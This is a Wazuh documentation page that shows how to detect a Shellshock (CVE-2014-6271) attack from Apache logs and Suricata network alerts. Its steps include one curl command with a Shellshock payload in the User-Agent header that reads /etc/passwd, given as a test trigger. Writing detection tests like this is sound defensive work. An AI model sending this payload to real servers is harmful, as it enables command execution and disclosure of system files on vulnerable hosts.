.. _poc_detect_web_attack_shellshock:

Detecting a web attack - Shellshock
===================================

This example shows how Wazuh can detect a Shellshock attack by analyzing web server logs collected from a monitored endpoint. Please check :ref:`Wazuh Shellshock Attack documentation <https://documentation.wazuh.com/current/learning-wazuh/shellshock.html>`.

In addition, for further detection, the attack can also be detected at a network level when Suricata integration is configured.

Prerequesites
-------------

- Apache server running on the monitored system (Linux RHEL)

- Wazuh agent configured to monitor the Apache access logs:

    .. code-block:: XML

        <localfile>
            <log_format>apache</log_format>
            <location>/var/log/httpd/access_log</location>
        </localfile>

- Suricata use case configured and monitoring the endpoint traffic (to make it easy, for the test, Suricata can run in the monitored system)

Configuration
-------------

This use case requires no additional configuration.

Steps to generate the alerts
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

- From an external host (the attacker), execute the following command:

    .. code-block:: XML

        curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" ${replace_by_your_web_server_address}

Alerts
^^^^^^

- For alert based on web server log analysis: rule.description:*shellshock*
- For alert based on network traffic analysis (Suricata NIDS): rule.description:*CVE-2014-6271*

Affected endpoint
^^^^^^^^^^^^^^^^^

- Linux RHEL